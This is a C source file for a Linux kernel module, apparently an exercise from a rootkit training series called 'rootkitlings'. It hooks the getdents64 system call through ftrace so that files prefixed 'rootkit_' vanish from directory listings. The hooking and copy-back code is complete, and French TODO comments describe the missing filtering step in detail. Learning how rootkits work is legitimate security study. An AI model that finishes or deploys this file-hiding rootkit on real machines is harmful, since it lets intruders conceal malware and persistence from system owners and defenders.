#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/dirent.h>
#include <linux/string.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("rootkitlings");
MODULE_DESCRIPTION("029: hide files with prefix from ls");

#define HIDE_PREFIX "rootkit_"

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent_buf =
        (struct linux_dirent64 __user *)regs->si;
    long ret;
    struct linux_dirent64 *kbuf, *cur, *prev;
    unsigned long offset;
    int hidden = 0;

    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, dirent_buf, ret)) {
        kfree(kbuf);
        return ret;
    }

    prev = NULL;
    offset = 0;

    while (offset < ret) {
        cur = (struct linux_dirent64 *)((char *)kbuf + offset);

        // TODO(rootkitlings): verifie si cur->d_name commence par HIDE_PREFIX.
        //   Si oui:
        //     - Si prev != NULL, ajoute cur->d_reclen a prev->d_reclen
        //       (l'entree precedente "absorbe" celle-ci)
        //     - Si prev == NULL (c'est la premiere entree), decale tout
        //       avec memmove et reduis ret de cur->d_reclen
        //     - Incremente hidden
        //   Si non:
        //     - prev = cur (avance le pointeur de l'entree precedente)
        //
        //   Dans tous les cas, avance offset de cur->d_reclen.
        //
        //   ~10 lignes de code.

        offset += cur->d_reclen;
    }

    if (hidden && copy_to_user(dirent_buf, kbuf, ret))
        pr_err("rootkitlings/029: copy_to_user failed\n");

    kfree(kbuf);
    return ret;
}

static struct fthelper_hook hook = {
    .name = "__x64_sys_getdents64",
    .hook_fn = hook_getdents64,
    .orig_fn = &orig_getdents64,
};

static int __init hidefiles_init(void)
{
    int ret;

    pr_info("rootkitlings/029: installing getdents64 hook\n");
    ret = fthelper_install(&hook);
    if (ret)
        return ret;

    pr_info("rootkitlings/029: files with prefix '%s' will be hidden\n",
            HIDE_PREFIX);
    return 0;
}

static void __exit hidefiles_exit(void)
{
    fthelper_remove(&hook);
    pr_info("rootkitlings/029: getdents64 hook removed\n");
}

module_init(hidefiles_init);
module_exit(hidefiles_exit);
